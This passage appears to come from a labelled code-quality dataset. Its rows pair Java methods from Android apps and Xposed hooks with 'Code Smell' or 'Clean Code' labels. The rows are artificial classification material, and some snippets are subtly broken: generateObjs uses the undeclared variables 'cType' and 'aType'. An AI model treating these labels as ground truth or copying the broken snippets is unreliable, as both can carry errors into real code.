      audioCallIconItem.setVisibility(View.GONE);
    }
    searchItemVisible=true;
    if (viewInChatItem != null)     viewInChatItem.setVisibility(View.GONE);
    updateSearchButtons(0,0,-1);
    updateBottomOverlay();
  }
  if ((threadMessageId == 0 || isTopic || chatMode == MODE_SAVED) && !UserObject.isReplyUser(currentUser)) {
    openSearchKeyboard=text == null;
    if (searchItem != null) {
      searchItem.openSearch(openSearchKeyboard);
    }
  }
  if (searchItem != null) {
    searchItem.setSearchFieldText(text,false);
  }
  getMediaDataController().searchMessagesInChat(searchingQuery=(text == null ? """" : text),dialog_id,mergeDialogId,classGuid,0,threadMessageId,false,searchingUserMessages,searchingChatMessages,!TextUtils.isEmpty(text),searchingReaction,searchingType=null);
  updatePinnedMessageView(true);
}",1,Code Smell
"private void performWriteContactsToPhoneBookInternal(ArrayList<TLRPC.TL_contact> contactsArray){
  Cursor cursor=null;
  try {
    Account account=systemAccount;
    if (!hasContactsPermission() || account == null) {
      return;
    }
    final SharedPreferences settings=MessagesController.getMainSettings(currentAccount);
    final boolean forceUpdate=!settings.getBoolean(""contacts_updated_v7"",false);
    if (forceUpdate) {
      settings.edit().putBoolean(""contacts_updated_v7"",true).commit();
    }
    final ContentResolver contentResolver=ApplicationLoader.applicationContext.getContentResolver();
    Uri rawContactUri=ContactsContract.RawContacts.CONTENT_URI.buildUpon().appendQueryParameter(ContactsContract.RawContacts.ACCOUNT_NAME,systemAccount.name).appendQueryParameter(ContactsContract.RawContacts.ACCOUNT_TYPE,systemAccount.type).build();
    cursor=contentResolver.query(rawContactUri,new String[]{BaseColumns._ID,ContactsContract.RawContacts.SYNC2},null,null,null);
    LongSparseArray<Long> bookContacts=new LongSparseArray<>();
    if (cursor != null) {
      while (cursor.moveToNext()) {
        bookContacts.put(cursor.getLong(1),cursor.getLong(0));
      }
      cursor.close();
      cursor=null;
      for (int a=0; a < contactsArray.size(); a++) {
        TLRPC.TL_contact u=contactsArray.get(a);
        if (forceUpdate || bookContacts.indexOfKey(u.user_id) < 0) {
          addContactToPhoneBook(getMessagesController().getUser(u.user_id),forceUpdate);
        }
      }
    }
  }
 catch (  Exception e) {
    FileLog.e(e);
  }
 finally {
    if (cursor != null) {
      cursor.close();
    }
  }
}",1,Code Smell
"@Override public void onProcessMessage(V2TIMMessage v2TIMMessage){
  String data=new String(v2TIMMessage.getCustomElem().getData());
  if (!TextUtils.isEmpty(data)) {
    invisibleBean=new InvisibleBean();
    try {
      JSONObject invisibleJson=new JSONObject(data);
      invisibleBean.src=invisibleJson.optString(TUIConstants.TUICustomerServicePlugin.CUSTOMER_SERVICE_BUSINESS_ID_SRC_KEY);
      JSONObject contentJson=invisibleJson.optJSONObject(TUICustomerServiceConstants.CUSTOMER_SERVICE_ITEM_CONTENT);
      if (contentJson != null) {
        invisibleBean.menuSendRuleFlag=contentJson.optInt(InvisibleBean.MENU_SEND_RULE_FLAG);
      }
    }
 catch (    JSONException e) {
      TUIChatLog.e(""InvisibleMessageBean"",""exception e = "" + e);
    }
  }
  if (invisibleBean != null) {
    if (invisibleBean.src.equals(TUIConstants.TUICustomerServicePlugin.BUSINESS_ID_SRC_CUSTOMER_SERVICE_EVALUATION_SELECTED)) {
      setExtra(TUIChatService.getAppContext().getString(R.string.satisfaction_evaluation));
    }
 else     if (invisibleBean.src.equals(TUIConstants.TUICustomerServicePlugin.BUSINESS_ID_SRC_CUSTOMER_SERVICE_END)) {
      setExtra(TUIChatService.getAppContext().getString(R.string.session_end));
    }
 else     if (invisibleBean.src.equals(TUIConstants.TUICustomerServicePlugin.BUSINESS_ID_SRC_CUSTOMER_SERVICE_TIMEOUT)) {
      setExtra(TUIChatService.getAppContext().getString(R.string.session_timeout));
    }
 else     if (invisibleBean.src.equals(TUIConstants.TUICustomerServicePlugin.BUSINESS_ID_SRC_CUSTOMER_SERVICE_EVALUATION_SETTING)) {
      int triggerResult=invisibleBean.menuSendRuleFlag & invisibleBean.RULE_USER_TRIGGER_EVALUATION;
      TUICustomerServicePluginService.getInstance().setCanTriggerEvaluation(triggerResult > 0 ? true : false);
    }
 else     if (invisibleBean.src.equals(TUIConstants.TUICustomerServicePlugin.BUSINESS_ID_SRC_CUSTOMER_SERVICE_TRIGGER_EVALUATION)) {
    }
 else     if (invisibleBean.src.equals(TUIConstants.TUICustomerServicePlugin.BUSINESS_ID_SRC_CUSTOMER_SERVICE_SAY_HELLO)) {
    }
 else {
      String text=TUICustomerServicePluginService.getAppContext().getString(com.tencent.qcloud.tuikit.timcommon.R.string.timcommon_no_support_msg);
      setExtra(text);
    }
  }
 else {
    String text=TUICustomerServicePluginService.getAppContext().getString(com.tencent.qcloud.tuikit.timcommon.R.string.timcommon_no_support_msg);
    setExtra(text);
  }
}",0,Clean Code
"public static void setupWithBottomNavigationView(@NonNull final BottomNavigationView bottomNavigationView,@NonNull final GroupScene groupScene,@IdRes final int containerId,@NonNull final LinkedHashMap<Integer,Scene> children){
  setupWithBottomNavigationView(bottomNavigationView,groupScene,containerId,children,null);
}
public static void setupWithBottomNavigationView(@NonNull final BottomNavigationView bottomNavigationView,@NonNull final GroupScene groupScene,@IdRes final int containerId,@NonNull final LinkedHashMap<Integer,Scene> children,@Nullable final BottomNavigationView.OnNavigationItemSelectedListener onNavigationItemSelectedListener){
  if (children.size() == 0) {
    throw new IllegalArgumentException(""children can't be empty"");
  }
  final List<String> menuIdList=new ArrayList<>();
  int menuSize=bottomNavigationView.getMenu().size();
  for (int i=0; i < menuSize; i++) {
    menuIdList.add(String.valueOf(bottomNavigationView.getMenu().getItem(i).getItemId()));
  }
  bottomNavigationView.setOnNavigationItemSelectedListener(new BottomNavigationView.OnNavigationItemSelectedListener(){
    @Override public boolean onNavigationItemSelected(    @NonNull MenuItem item){
      if (onNavigationItemSelectedListener != null) {
        onNavigationItemSelectedListener.onNavigationItemSelected(item);
      }
      item.setChecked(true);
      String tag=String.valueOf(item.getItemId());
      Scene scene=groupScene.findSceneByTag(tag);
      if (scene == null) {
        scene=children.get(item.getItemId());
      }
      if (!groupScene.isAdded(scene)) {
        groupScene.add(containerId,scene,tag);
      }
 else       if (!groupScene.isShowing(scene)) {
        groupScene.show(scene);
      }
      for (int i=0; i < menuIdList.size(); i++) {
        Scene otherScene=groupScene.findSceneByTag(menuIdList.get(i));
        if (otherScene != null && otherScene != scene && groupScene.isAdded(otherScene) && groupScene.isShowing(otherScene)) {
          groupScene.hide(otherScene);
        }
      }
      return true;
    }
  }
);
  Map.Entry<Integer,Scene> firstItem=children.entrySet().iterator().next();
  String tag=String.valueOf(firstItem.getKey());
  Scene scene=groupScene.findSceneByTag(tag);
  if (scene == null) {
    scene=firstItem.getValue();
  }
  if (!groupScene.isAdded(scene)) {
    groupScene.add(containerId,scene,tag);
  }
 else   if (!groupScene.isShowing(scene)) {
    groupScene.show(scene);
  }
  for (int i=0; i < menuIdList.size(); i++) {
    Scene otherScene=groupScene.findSceneByTag(menuIdList.get(i));
    if (otherScene != null && otherScene != scene && groupScene.isAdded(otherScene) && groupScene.isShowing(otherScene)) {
      groupScene.hide(otherScene);
    }
  }
  bottomNavigationView.getMenu().findItem(firstItem.getKey()).setChecked(true);
}",1,Code Smell
"public static void handleReadDocument(Activity activity,@Nullable Uri data) throws IOException, JSONException {
  if (data == null)   return;
  SharedPreferences.Editor edit=PrefsUtils.mSharedPreferences.edit();
  InputStream inputStream=activity.getContentResolver().openInputStream(data);
  BufferedReader bufferedReader=new BufferedReader(new InputStreamReader(inputStream));
  StringBuilder stringBuilder=new StringBuilder();
  String line=bufferedReader.readLine();
  while (line != null) {
    stringBuilder.append(line);
    line=bufferedReader.readLine();
  }
  String read=stringBuilder.toString();
  JSONObject jsonObject=new JSONObject(read);
  Iterator<String> keys=jsonObject.keys();
  while (keys.hasNext()) {
    String key=keys.next();
    Object value=jsonObject.get(key);
    if (value instanceof String) {
      if (((String)value).contains(""["") && ((String)value).contains(""]"")) {
        value=((String)value).replace(""["","""").replace(""]"","""").replace("" "","""");
        String[] array=((String)value).split("","");
        List<String> list=Arrays.asList(array);
        Set<String> stringSet=new HashSet<>(list);
        edit.putStringSet(key,stringSet);
      }
 else {
        edit.putString(key,(String)value);
      }
    }
 else     if (value instanceof Boolean) {
      edit.putBoolean(key,(Boolean)value);
    }
 else     if (value instanceof Integer) {
      edit.putInt(key,(Integer)value);
    }
  }
  bufferedReader.close();
  edit.apply();
}
",1,Code Smell
"@SuppressWarnings(""unchecked"") private static boolean isSynthesizable(Class<? extends Annotation> annotationType){
  if (hasPlainJavaAnnotationsOnly(annotationType)) {
    return false;
  }
  Boolean synthesizable=synthesizableCache.get(annotationType);
  if (synthesizable != null) {
    return synthesizable;
  }
  synthesizable=Boolean.FALSE;
  for (  Method attribute : getAttributeMethods(annotationType)) {
    if (!getAttributeAliasNames(attribute).isEmpty()) {
      synthesizable=Boolean.TRUE;
      break;
    }
    Class<?> returnType=attribute.getReturnType();
    if (Annotation[].class.isAssignableFrom(returnType)) {
      Class<? extends Annotation> nestedAnnotationType=(Class<? extends Annotation>)returnType.getComponentType();
      if (isSynthesizable(nestedAnnotationType)) {
        synthesizable=Boolean.TRUE;
        break;
      }
    }
 else     if (Annotation.class.isAssignableFrom(returnType)) {
      Class<? extends Annotation> nestedAnnotationType=(Class<? extends Annotation>)returnType;
      if (isSynthesizable(nestedAnnotationType)) {
        synthesizable=Boolean.TRUE;
        break;
      }
    }
  }
  synthesizableCache.put(annotationType,synthesizable);
  return synthesizable;
}
",0,Clean Code
"private void openAddMember(){
  Bundle args=new Bundle();
  args.putBoolean(""addToGroup"",true);
  args.putLong(""chatId"",currentChat.id);
  GroupCreateActivity fragment=new GroupCreateActivity(args);
  fragment.setInfo(chatInfo);
  if (chatInfo != null && chatInfo.participants != null) {
    LongSparseArray<TLObject> users=new LongSparseArray<>();
    for (int a=0; a < chatInfo.participants.participants.size(); a++) {
      users.put(chatInfo.participants.participants.get(a).user_id,null);
    }
    fragment.setIgnoreUsers(users);
  }
  fragment.setDelegate((users,fwdCount) -> {
    HashSet<Long> currentParticipants=new HashSet<>();
    ArrayList<TLRPC.User> addedUsers=new ArrayList<>();
    if (chatInfo.participants.participants != null) {
      for (int i=0; i < chatInfo.participants.participants.size(); i++) {
        currentParticipants.add(chatInfo.participants.participants.get(i).user_id);
      }
    }
    getMessagesController().addUsersToChat(currentChat,ProfileActivity.this,users,fwdCount,user -> {
      addedUsers.add(user);
    }
,restrictedUser -> {
      for (int i=0; i < chatInfo.participants.participants.size(); i++) {
        if (chatInfo.participants.participants.get(i).user_id == restrictedUser.id) {
          chatInfo.participants.participants.remove(i);
          updateListAnimated(true);
          break;
        }
      }
    }
,() -> {
      int N=addedUsers.size();
      int[] finished=new int[1];
      for (int a=0; a < N; a++) {
        TLRPC.User user=addedUsers.get(a);
        if (!currentParticipants.contains(user.id)) {
          if (chatInfo.participants == null) {
            chatInfo.participants=new TLRPC.TL_chatParticipants();
          }
          if (ChatObject.isChannel(currentChat)) {
            TLRPC.TL_chatChannelParticipant channelParticipant1=new TLRPC.TL_chatChannelParticipant();
            channelParticipant1.channelParticipant=new TLRPC.TL_channelParticipant();
            channelParticipant1.channelParticipant.inviter_id=getUserConfig().getClientUserId();
            channelParticipant1.channelParticipant.peer=new TLRPC.TL_peerUser();
            channelParticipant1.channelParticipant.peer.user_id=user.id;
            channelParticipant1.channelParticipant.date=getConnectionsManager().getCurrentTime();
            channelParticipant1.user_id=user.id;
            chatInfo.participants.participants.add(channelParticipant1);
          }
 else {
            TLRPC.ChatParticipant participant=new TLRPC.TL_chatParticipant();
            participant.user_id=user.id;
            participant.inviter_id=getAccountInstance().getUserConfig().clientUserId;
            chatInfo.participants.participants.add(participant);
          }
          chatInfo.participants_count++;
          getMessagesController().putUser(user,false);
        }
      }
      updateListAnimated(true);
    }
);
  }
);
  presentFragment(fragment);
}",1,Code Smell
"public int getMenuLeft(View content,int page){
  if (mMode == SlidingMenu.LEFT) {
switch (page) {
case 0:
      return content.getLeft() - getBehindWidth();
case 2:
    return content.getLeft();
}
}
 else if (mMode == SlidingMenu.RIGHT) {
switch (page) {
case 0:
  return content.getLeft();
case 2:
return content.getLeft() + getBehindWidth();
}
}
 else if (mMode == SlidingMenu.LEFT_RIGHT) {
switch (page) {
case 0:
return content.getLeft() - getBehindWidth();
case 2:
return content.getLeft() + getBehindWidth();
}
}
return content.getLeft();
}",0,Clean Code
"@Override public TreeVisitor<?,ExecutionContext> getVisitor(){
  JavaIsoVisitor<ExecutionContext> condition=new JavaIsoVisitor<ExecutionContext>(){
    @Override public @Nullable J preVisit(    J tree,    ExecutionContext ctx){
      if (tree instanceof JavaSourceFile) {
        JavaSourceFile cu=(JavaSourceFile)requireNonNull(tree);
        if (cu.getPackageDeclaration() != null) {
          String original=cu.getPackageDeclaration().getExpression().printTrimmed(getCursor()).replaceAll(""\\s"","""");
          if (original.startsWith(oldPackageName)) {
            return SearchResult.found(cu);
          }
        }
        boolean recursive=Boolean.TRUE.equals(ChangePackage.this.recursive);
        String recursivePackageNamePrefix=oldPackageName + ""."";
        for (        J.Import anImport : cu.getImports()) {
          String importedPackage=anImport.getPackageName();
          if (importedPackage.equals(oldPackageName) || recursive && importedPackage.startsWith(recursivePackageNamePrefix)) {
            return SearchResult.found(cu);
          }
        }
        for (        JavaType type : cu.getTypesInUse().getTypesInUse()) {
          if (type instanceof JavaType.FullyQualified) {
            String packageName=((JavaType.FullyQualified)type).getPackageName();
            if (packageName.equals(oldPackageName) || recursive && packageName.startsWith(recursivePackageNamePrefix)) {
              return SearchResult.found(cu);
            }
          }
        }
        stopAfterPreVisit();
      }
      return super.preVisit(tree,ctx);
    }
  }
;
  return Preconditions.check(condition,new ChangePackageVisitor());
}
",1,Code Smell
"/** 
 * Check whether this exception contains an exception of the given type: either it is of the given class itself or it contains a nested cause of the given type.
 * @param exType the exception type to look for
 * @return whether there is a nested exception of the specified type
 */
public boolean contains(Class exType){
  if (exType == null) {
    return false;
  }
  if (exType.isInstance(this)) {
    return true;
  }
  Throwable cause=getCause();
  if (cause == this) {
    return false;
  }
  if (cause instanceof NestedRuntimeException) {
    return ((NestedRuntimeException)cause).contains(exType);
  }
 else {
    while (cause != null) {
      if (exType.isInstance(cause)) {
        return true;
      }
      if (cause.getCause() == cause) {
        break;
      }
      cause=cause.getCause();
    }
    return false;
  }
}
",1,Code Smell
"@Override public void onClick(View widget){
  Object tag=widget.getTag(R.id.linkify_click_handler);
  if (tag != null) {
    ((LinkifyClickHandler)tag).onUrlClick(url);
  }
 else {
    super.onClick(widget);
  }
}
@Override public void onClick(View widget){
  Object tag=widget.getTag(R.id.linkify_click_handler);
  if (tag != null) {
    ((LinkifyClickHandler)tag).onTimeClick(url);
  }
}
",0,Clean Code
"private void generateObjs(JMethod method,HeapModel heapModel,int k){
  Deque<Pair<Obj,Integer>> queue=new ArrayDeque<>();
  if (!method.isStatic() && !method.getDeclaringClass().isAbstract()) {
    thisObj=heapModel.getMockObj(Descriptor.ENTRY_DESC,new MethodParam(method,THIS_INDEX),method.getDeclaringClass().getType(),method);
    queue.add(new Pair<>(thisObj,0));
  }
  paramObjs=new Obj[method.getParamCount()];
  for (int i=0; i < method.getParamCount(); ++i) {
    Type paramType=method.getParamType(i);
    if (isInstantiable(paramType)) {
      paramObjs[i]=heapModel.getMockObj(Descriptor.ENTRY_DESC,new MethodParam(method,i),paramType,method);
      queue.add(new Pair<>(paramObjs[i],0));
    }
  }
  fieldObjs=Maps.newTwoKeyMultiMap();
  arrayObjs=Maps.newMultiMap();
  while (!queue.isEmpty()) {
    Pair<Obj,Integer> pair=queue.pop();
    Obj base=pair.first();
    int level=pair.second();
    if (level < k) {
      Type type=base.getType();
      if (type instanceof ClassType) {
        for (        JField field : cType.getJClass().getDeclaredFields()) {
          Type fieldType=field.getType();
          if (isInstantiable(fieldType)) {
            Obj obj=heapModel.getMockObj(Descriptor.ENTRY_DESC,base.getAllocation() + ""."" + field.getName(),fieldType,method);
            fieldObjs.put(base,field,obj);
            queue.add(new Pair<>(obj,level + 1));
          }
        }
      }
 else       if (type instanceof ArrayType) {
        Type elemType=aType.elementType();
        if (isInstantiable(elemType)) {
          Obj elem=heapModel.getMockObj(Descriptor.ENTRY_DESC,base.getAllocation() + ""[*]"",elemType,method);
          arrayObjs.put(base,elem);
          queue.add(new Pair<>(elem,level + 1));
        }
      }
    }
  }
}",1,Code Smell
"private void createPanel(final boolean indeterminate,final boolean showSeconds,final boolean showCancelButton,final boolean addBorder){
  setLayout(new BorderLayout());
  final JPanel pPb=new JPanel(new BorderLayout());
  pPb.setBorder(new TitledBorder(""""));
  if (m_description == null) {
    m_label.setVisible(false);
  }
 else {
    m_label.setText(convertTextToHtml(m_description));
  }
  pPb.add(m_label,BorderLayout.NORTH);
  m_progressBar.setIndeterminate(indeterminate);
  m_progressBar.setStringPainted(true);
  final JPanel borderPanel=new JPanel(new BorderLayout());
  if (addBorder) {
    borderPanel.setBorder(BorderFactory.createCompoundBorder(new LineBorder(Color.GRAY),new EmptyBorder(1,1,1,1)));
  }
  if (showCancelButton) {
    final JPanel buttonPanel=new JPanel(new BorderLayout());
    final JButton cancelButton=new JButton(new CancelAction());
    cancelButton.setFocusable(false);
    final JPanel paddingPanel=new JPanel(new BorderLayout());
    paddingPanel.setBorder(new EmptyBorder(0,1,0,0));
    paddingPanel.setMinimumSize(new Dimension(1,0));
    buttonPanel.add(paddingPanel,BorderLayout.WEST);
    buttonPanel.add(cancelButton,BorderLayout.EAST);
    borderPanel.add(buttonPanel,BorderLayout.EAST);
  }
  borderPanel.add(m_progressBar,BorderLayout.CENTER);
  pPb.add(borderPanel,BorderLayout.CENTER);
  if (indeterminate && showSeconds) {
    updateSecondsText();
    m_timer.setRepeats(true);
  }
  add(pPb,BorderLayout.NORTH);
}",0,Clean Code
"protected boolean computeScrollHelper(){
  if (mScroller.computeScrollOffset()) {
    int oldPos=mOrientationHandler.getPrimaryScroll(this);
    int newPos=mScroller.getCurrX();
    if (oldPos != newPos) {
      mOrientationHandler.setPrimary(this,VIEW_SCROLL_TO,mScroller.getCurrX());
    }
    if (mAllowOverScroll) {
      if (newPos < mMinScroll && oldPos >= mMinScroll) {
        mEdgeGlowLeft.onAbsorb((int)mScroller.getCurrVelocity());
        abortScrollerAnimation(false);
        onEdgeAbsorbingScroll();
      }
 else       if (newPos > mMaxScroll && oldPos <= mMaxScroll) {
        mEdgeGlowRight.onAbsorb((int)mScroller.getCurrVelocity());
        abortScrollerAnimation(false);
        onEdgeAbsorbingScroll();
      }
    }
    int finalPos=mOrientationHandler.getPrimaryValue(mScroller.getFinalX(),mScroller.getFinalY());
    if (newPos == finalPos && mEdgeGlowLeft.isFinished() && mEdgeGlowRight.isFinished()) {
      abortScrollerAnimation(false);
    }
    invalidate();
    return true;
  }
 else   if (mNextPage != INVALID_PAGE) {
    sendScrollAccessibilityEvent();
    int prevPage=mCurrentPage;
    mCurrentPage=validateNewPage(mNextPage);
    mCurrentScrollOverPage=mCurrentPage;
    mNextPage=INVALID_PAGE;
    notifyPageSwitchListener(prevPage);
    if (!mIsBeingDragged) {
      pageEndTransition();
    }
    if (canAnnouncePageDescription()) {
      announcePageForAccessibility();
    }
  }
  return false;
}
",1,Code Smell
"/** 
 * @hide 
 */
@Override public CharSequence getText(int id) throws NotFoundException {
  Object replacement=getReplacement(id);
  if (replacement instanceof CharSequence) {
    return (CharSequence)replacement;
  }
 else   if (replacement instanceof XResForwarder) {
    Resources repRes=((XResForwarder)replacement).getResources();
    int repId=((XResForwarder)replacement).getId();
    return repRes.getText(repId);
  }
  return super.getText(id);
}
/** 
 * @hide 
 */
@Override public CharSequence getText(int id,CharSequence def){
  Object replacement=getReplacement(id);
  if (replacement instanceof CharSequence) {
    return (CharSequence)replacement;
  }
 else   if (replacement instanceof XResForwarder) {
    Resources repRes=((XResForwarder)replacement).getResources();
    int repId=((XResForwarder)replacement).getId();
    return repRes.getText(repId,def);
  }
  return super.getText(id,def);
}
@Override public CharSequence getText(int index){
  Object replacement=((XResources)getResources()).getReplacement(getResourceId(index,0));
  if (replacement instanceof CharSequence) {
    return (CharSequence)replacement;
  }
 else   if (replacement instanceof XResForwarder) {
    Resources repRes=((XResForwarder)replacement).getResources();
    int repId=((XResForwarder)replacement).getId();
    return repRes.getText(repId);
  }
  return super.getText(index);
}",0,Clean Code
"private void onSubscribe(int buttonState){
  if (!mIsMetadataLoaded) {
    MessageHelpers.showMessage(getContext(),R.string.wait_data_loading);
    return;
  }
  if (!YouTubeSignInService.instance().isSigned()) {
    MessageHelpers.showMessage(getContext(),R.string.msg_signed_users_only);
    return;
  }
  if (buttonState == PlayerUI.BUTTON_OFF) {
    callMediaItemObservable(mMediaItemService::subscribeObserve);
  }
 else {
    callMediaItemObservable(mMediaItemService::unsubscribeObserve);
  }
  getPlayer().getVideo().isSubscribed=buttonState == PlayerUI.BUTTON_OFF;
  getPlayer().setButtonState(R.id.action_subscribe,buttonState == PlayerUI.BUTTON_OFF ? PlayerUI.BUTTON_ON : PlayerUI.BUTTON_OFF);
}
",0,Clean Code
"public static void loadCountries(Utilities.Callback<Pair<Map<String,List<TLRPC.TL_help_country>>,List<String>>> onDone){
  ConnectionsManager connection=ConnectionsManager.getInstance(UserConfig.selectedAccount);
  TLRPC.TL_help_getCountriesList req=new TLRPC.TL_help_getCountriesList();
  req.lang_code=LocaleController.getInstance().getCurrentLocaleInfo() != null ? LocaleController.getInstance().getCurrentLocaleInfo().getLangCode() : Locale.getDefault().getCountry();
  int reqId=connection.sendRequest(req,(response,error) -> {
    if (response != null) {
      TLRPC.TL_help_countriesList help_countriesList=(TLRPC.TL_help_countriesList)response;
      Map<String,List<TLRPC.TL_help_country>> countriesMap=new HashMap<>();
      List<String> sortedLetters=new ArrayList<>();
      for (int i=0; i < help_countriesList.countries.size(); i++) {
        TLRPC.TL_help_country country=help_countriesList.countries.get(i);
        if (country.name != null) {
          country.default_name=country.name;
        }
        if (country.iso2.equalsIgnoreCase(""FT"")) {
          continue;
        }
        String letter=country.default_name.substring(0,1).toUpperCase();
        List<TLRPC.TL_help_country> arr=countriesMap.get(letter);
        if (arr == null) {
          arr=new ArrayList<>();
          countriesMap.put(letter,arr);
          sortedLetters.add(letter);
        }
        arr.add(country);
      }
      Comparator<String> comparator;
      if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
        Collator collator=Collator.getInstance(LocaleController.getInstance().getCurrentLocale() != null ? LocaleController.getInstance().getCurrentLocale() : Locale.getDefault());
        comparator=collator::compare;
      }
 else {
        comparator=String::compareTo;
      }
      Collections.sort(sortedLetters,comparator);
      for (      List<TLRPC.TL_help_country> arr : countriesMap.values()) {
        Collections.sort(arr,(country,country2) -> comparator.compare(country.default_name,country2.default_name));
      }
      AndroidUtilities.runOnUIThread(() -> onDone.run(new Pair<>(countriesMap,sortedLetters)));
    }
  }
);
}",1,Code Smell
"private static int cloneBlocks(BoundingBox sourceArea,ServerLevel world,BlockPos diffToTarget){
  int blockPastes=0;
  List<StructureTemplate.StructureBlockInfo> blocks=Lists.newArrayList();
  List<StructureTemplate.StructureBlockInfo> beBlocks=Lists.newArrayList();
  for (int z=sourceArea.minZ(); z <= sourceArea.maxZ(); ++z) {
    for (int y=sourceArea.minY(); y <= sourceArea.maxY(); ++y) {
      for (int x=sourceArea.minX(); x <= sourceArea.maxX(); ++x) {
        BlockPos currentPos=new BlockPos(x,y,z);
        BlockPos newPos=currentPos.offset(diffToTarget);
        BlockInWorld cached=new BlockInWorld(world,currentPos,false);
        BlockState state=cached.getState();
        BlockEntity be=world.getBlockEntity(currentPos);
        if (be != null) {
          CompoundTag nbt=be.saveWithFullMetadata();
          beBlocks.add(new StructureTemplate.StructureBlockInfo(newPos,state,nbt));
        }
 else {
          blocks.add(new StructureTemplate.StructureBlockInfo(newPos,state,null));
        }
      }
    }
  }
  List<StructureTemplate.StructureBlockInfo> allBlocks=Lists.newArrayList();
  allBlocks.addAll(blocks);
  allBlocks.addAll(beBlocks);
  List<StructureTemplate.StructureBlockInfo> reverse=Lists.reverse(allBlocks);
  for (  StructureTemplate.StructureBlockInfo info : reverse) {
    BlockEntity be=world.getBlockEntity(info.pos());
    Clearable.tryClear(be);
    world.setBlock(info.pos(),Blocks.BARRIER.defaultBlockState(),2);
  }
  for (  StructureTemplate.StructureBlockInfo info : allBlocks) {
    if (world.setBlock(info.pos(),info.state(),2))     blockPastes++;
  }
  for (  StructureTemplate.StructureBlockInfo info : beBlocks) {
    BlockEntity be=world.getBlockEntity(info.pos());
    if (be != null && info.nbt() != null) {
      info.nbt().putInt(""x"",info.pos().getX());
      info.nbt().putInt(""y"",info.pos().getY());
      info.nbt().putInt(""z"",info.pos().getZ());
      be.load(info.nbt());
      be.setChanged();
    }
    world.setBlock(info.pos(),info.state(),2);
  }
  for (  StructureTemplate.StructureBlockInfo info : reverse) {
    world.blockUpdated(info.pos(),info.state().getBlock());
  }
  world.getBlockTicks().copyArea(sourceArea,diffToTarget);
  return blockPastes;
}",1,Code Smell
"@NonNull @Override public Resource<Bitmap> transform(@NonNull Context context,@NonNull Resource<Bitmap> resource,int outWidth,int outHeight){
  Bitmap source=resource.get();
  int finalWidth, finalHeight;
  float ratio;
  if (outWidth > outHeight) {
    ratio=(float)outHeight / (float)outWidth;
    finalWidth=source.getWidth();
    finalHeight=(int)((float)source.getWidth() * ratio);
    if (finalHeight > source.getHeight()) {
      ratio=(float)outWidth / (float)outHeight;
      finalHeight=source.getHeight();
      finalWidth=(int)((float)source.getHeight() * ratio);
    }
  }
 else   if (outWidth < outHeight) {
    ratio=(float)outWidth / (float)outHeight;
    finalHeight=source.getHeight();
    finalWidth=(int)((float)source.getHeight() * ratio);
    if (finalWidth > source.getWidth()) {
      ratio=(float)outHeight / (float)outWidth;
      finalWidth=source.getWidth();
      finalHeight=(int)((float)source.getWidth() * ratio);
    }
  }
 else {
    finalHeight=source.getHeight();
    finalWidth=finalHeight;
  }
  this.radius*=(float)finalHeight / (float)outHeight;
  Bitmap outBitmap=this.mBitmapPool.get(finalWidth,finalHeight,Bitmap.Config.ARGB_8888);
  if (outBitmap == null) {
    outBitmap=Bitmap.createBitmap(finalWidth,finalHeight,Bitmap.Config.ARGB_8888);
  }
  Canvas canvas=new Canvas(outBitmap);
  Paint paint=new Paint();
  BitmapShader shader=new BitmapShader(source,Shader.TileMode.CLAMP,Shader.TileMode.CLAMP);
  int width=(source.getWidth() - finalWidth) / 2;
  int height=(source.getHeight() - finalHeight) / 2;
  if (width != 0 || height != 0) {
    Matrix matrix=new Matrix();
    matrix.setTranslate((float)(-width),(float)(-height));
    shader.setLocalMatrix(matrix);
  }
  paint.setShader(shader);
  paint.setAntiAlias(true);
  RectF rectF=new RectF(0.0F,0.0F,(float)canvas.getWidth(),(float)canvas.getHeight());
  canvas.drawRoundRect(rectF,this.radius,this.radius,paint);
  if (exceptLeftTop) {
    canvas.drawRect(0,0,radius,radius,paint);
  }
  if (exceptRightTop) {
    canvas.drawRect(canvas.getWidth() - radius,0,radius,radius,paint);
  }
  if (exceptLeftBottom) {
    canvas.drawRect(0,canvas.getHeight() - radius,radius,canvas.getHeight(),paint);
  }
  if (exceptRightBotoom) {
    canvas.drawRect(canvas.getWidth() - radius,canvas.getHeight() - radius,canvas.getWidth(),canvas.getHeight(),paint);
  }
  return BitmapResource.obtain(outBitmap,this.mBitmapPool);
}",1,Code Smell
"@Override protected final void onCreate(@Nullable Bundle savedInstanceState){
  super.onCreate(savedInstanceState);
  if (savedInstanceState != null) {
    mStageId=savedInstanceState.getInt(KEY_STAGE_ID,IntIdGenerator.INVALID_ID);
    ArrayList<String> list=savedInstanceState.getStringArrayList(KEY_SCENE_TAG_LIST);
    if (list != null) {
      mSceneTagList.addAll(list);
      mDelaySceneTagList.addAll(list);
    }
    mIdGenerator.lazySet(savedInstanceState.getInt(KEY_NEXT_ID));
  }
  if (mStageId == IntIdGenerator.INVALID_ID) {
    ((SceneApplication)getApplicationContext()).registerStageActivity(this);
  }
 else {
    ((SceneApplication)getApplicationContext()).registerStageActivity(this,mStageId);
  }
  onCreate2(savedInstanceState);
  Intent intent=getIntent();
  if (savedInstanceState == null) {
    if (intent != null) {
      String action=intent.getAction();
      if (Intent.ACTION_MAIN.equals(action)) {
        Announcer announcer=getLaunchAnnouncer();
        if (announcer != null) {
          startScene(announcer);
          return;
        }
      }
 else       if (ACTION_START_SCENE.equals(action)) {
        if (startSceneFromIntent(intent)) {
          return;
        }
      }
    }
    onUnrecognizedIntent(intent);
  }
}",1,Code Smell
"@Override public void hook() throws Throwable {
  if (Helper.prefs.getBoolean(""switch_mainswitch"",false) && Helper.prefs.getBoolean(""switch_reddot"",false)) {
    XposedBridge.hookAllMethods(FeedsTabsFragment,""onUnReadCountLoaded"",XC_MethodReplacement.returnConstant(null));
    if (BaseFeedFollowAvatarViewHolder_setUnreadTipVisibility != null)     XposedBridge.hookMethod(BaseFeedFollowAvatarViewHolder_setUnreadTipVisibility,XC_MethodReplacement.returnConstant(null));
    if (ZHMainTabLayout_updateBadges != null)     XposedBridge.hookMethod(ZHMainTabLayout_updateBadges,XC_MethodReplacement.returnConstant(null));
    if (BottomNavMenuItemView_setUnreadCount != null)     XposedBridge.hookMethod(BottomNavMenuItemView_setUnreadCount,XC_MethodReplacement.returnConstant(null));
    if (BottomNavMenuItemViewForIconOnly_setUnreadCount != null)     XposedBridge.hookMethod(BottomNavMenuItemViewForIconOnly_setUnreadCount,XC_MethodReplacement.returnConstant(null));
    if (BaseBottomNavMenuItemView_setNavBadge != null)     XposedBridge.hookMethod(BaseBottomNavMenuItemView_setNavBadge,XC_MethodReplacement.returnConstant(null));
